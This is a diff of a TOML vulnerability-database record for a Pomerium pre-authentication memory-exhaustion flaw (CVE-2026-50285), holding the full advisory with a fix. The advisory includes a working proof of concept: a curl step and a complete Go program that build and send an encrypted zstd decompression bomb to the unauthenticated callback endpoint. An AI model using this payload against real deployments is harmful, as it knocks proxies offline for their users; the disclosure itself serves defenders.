@@ -1,10 +1,6 @@
-[id]
-ave_id = "AVE-2026-0351"
-aliases = ["CVE-2026-50285","GHSA-ggw3-5987-rx77"]
-
 [basic]
-title = "Pomerium Pre-Auth Memory Exhaustion via Unbounded zstd Decompression in HPKE Callback"
-description = "## Summary
+description = """
+## Summary
 
 The HPKE V2 URL decode path in `pkg/hpke/url.go` decompresses attacker-controlled zstd data without any size limit. On Pomerium deployments using the stateless authentication flow (Pomerium Zero / hosted authenticate), the proxy's `/.pomerium/callback` endpoint is reachable without credentials and processes attacker-crafted HPKE-encrypted payloads before the sender's identity is validated. Because Pomerium's HPKE receiver public key is publicly served, an attacker can encrypt a decompression bomb, deliver it to the callback endpoint, and cause unbounded memory allocation — crashing or degrading the proxy process.
 
@@ -97,7 +93,7 @@ The proxy registers the callback route without any session or signature middlewa
 
 ```go
 c := r.PathPrefix(endpoints.PathPomeriumCallback).Subrouter()
-c.Path(\"/\").Handler(httputil.HandlerFunc(p.Callback)).Methods(http.MethodGet)
+c.Path("/").Handler(httputil.HandlerFunc(p.Callback)).Methods(http.MethodGet)
 ```
 
 For Stateless-flow deployments, `p.Callback` → `authenticateflow.Stateless.Callback` → `hpke.DecryptURLValues` (unbounded decompress) → `validateSenderPublicKey` (rejects). This is by design: the callback endpoint must be pre-auth because it is the landing page after an IdP OAuth redirect.
@@ -117,7 +113,7 @@ The full attack requires no credentials of any kind.
 
 ```bash
 # Step 1: Retrieve the receiver public key
-curl -so receiver.pub \"https://TARGET_HOSTNAME/.well-known/pomerium/hpke-public-key\" | xxd | head
+curl -so receiver.pub "https://TARGET_HOSTNAME/.well-known/pomerium/hpke-public-key" | xxd | head
 
 # Step 2: Build and send the decompression bomb (requires Go)
 ```
@@ -126,19 +122,19 @@ curl -so receiver.pub \"https://TARGET_HOSTNAME/.well-known/pomerium/hpke-public
 package main
 
 import (
-    \"encoding/base64\"
-    \"fmt\"
-    \"net/http\"
-    \"net/url\"
-    \"strings\"
+    "encoding/base64"
+    "fmt"
+    "net/http"
+    "net/url"
+    "strings"
 
-    \"github.com/klauspost/compress/zstd\"
-    \"github.com/pomerium/pomerium/pkg/hpke\"
+    "github.com/klauspost/compress/zstd"
+    "github.com/pomerium/pomerium/pkg/hpke"
 )
 
 func main() {
     // Fetch receiver public key from the target
-    resp, _ := http.Get(\"https://TARGET_HOSTNAME/.well-known/pomerium/hpke-public-key\")
+    resp, _ := http.Get("https://TARGET_HOSTNAME/.well-known/pomerium/hpke-public-key")
     pubBytes := make([]byte, 32)
     resp.Body.Read(pubBytes)
     resp.Body.Close()
@@ -149,7 +145,7 @@ func main() {
     attackerPriv, _ := hpke.GeneratePrivateKey()
 
     // Build a decompression bomb: 128 MiB of repeated bytes → ~19 KB compressed
-    plain := \"x=\" + strings.Repeat(\"A\", 128*1024*1024)
+    plain := "x=" + strings.Repeat("A", 128*1024*1024)
     enc, _ := zstd.NewWriter(nil)
     compressed := enc.EncodeAll([]byte(plain), nil)
 
@@ -157,15 +153,16 @@ func main() {
     sealed, _ := hpke.Seal(attackerPriv, receiverPub, compressed)
 
     form := url.Values{
-        \"k\": {attackerPriv.PublicKey().String()},
-        \"q\": {base64.RawURLEncoding.EncodeToString(sealed)},
+        "k": {attackerPriv.PublicKey().String()},
+        "q": {base64.RawURLEncoding.EncodeToString(sealed)},
     }
 
     // Deliver to the pre-auth callback endpoint
-    target := \"https://TARGET_HOSTNAME/.pomerium/callback/?\" + form.Encode()
-    fmt.Printf(\"Sending bomb to: %s\n\", target)
+    target := "https://TARGET_HOSTNAME/.pomerium/callback/?" + form.Encode()
+    fmt.Printf("Sending bomb to: %s
+", target)
     http.Get(target)
-    fmt.Println(\"Done — server allocated ~256 MB per request\")
+    fmt.Println("Done — server allocated ~256 MB per request")
 }
 ```
 
@@ -193,7 +190,7 @@ func decodeQueryStringV2(raw []byte) (url.Values, error) {
         return nil, err
     }
     if len(bs) > maxDecompressedQuerySize {
-        return nil, fmt.Errorf(\"hpke: decompressed query string exceeds maximum size (%d bytes)\", len(bs))
+        return nil, fmt.Errorf("hpke: decompressed query string exceeds maximum size (%d bytes)", len(bs))
     }
     return url.ParseQuery(string(bs))
 }
@@ -207,7 +204,7 @@ Restructure `DecryptURLValues` so the sender's public key is compared against th
 
 ```go
 // In Stateless.Callback, before calling DecryptURLValues:
-senderPublicKey, _ := PublicKeyFromString(r.Form.Get(\"k\"))
+senderPublicKey, _ := PublicKeyFromString(r.Form.Get("k"))
 if err := s.validateSenderPublicKey(r.Context(), senderPublicKey); err != nil {
     return err  // reject before decompression
 }
@@ -218,21 +215,29 @@ This eliminates the DoS attack path entirely for the callback endpoint but does 
 
 ## Credit
 
-This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai)."
-severity = "HIGH"
-score = 5
-sources = ["ghsa"]
-published = ""
-updated = ""
+This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai)."""
+published = "2026-01-01"
 remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Pomerium Pre-Auth Memory Exhaustion via Unbounded zstd Decompression in HPKE Callback"
+updated = "2026-01-01"
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = [
+    "CVE-2026-50285",
+    "GHSA-ggw3-5987-rx77",
+]
+ave_id = "AVE-2026-0351"
+
+[meta]
+collected_at = "2026-07-23T04:00:00.434156920+00:00"
+status = "completed"
 
 [references]
 urls = []
-
-[exploit]
-poc_urls = []
-exp_urls = []
-
-[meta]
-status = "completed"
-collected_at = "2026-07-23T04:00:00.434156920+00:00"
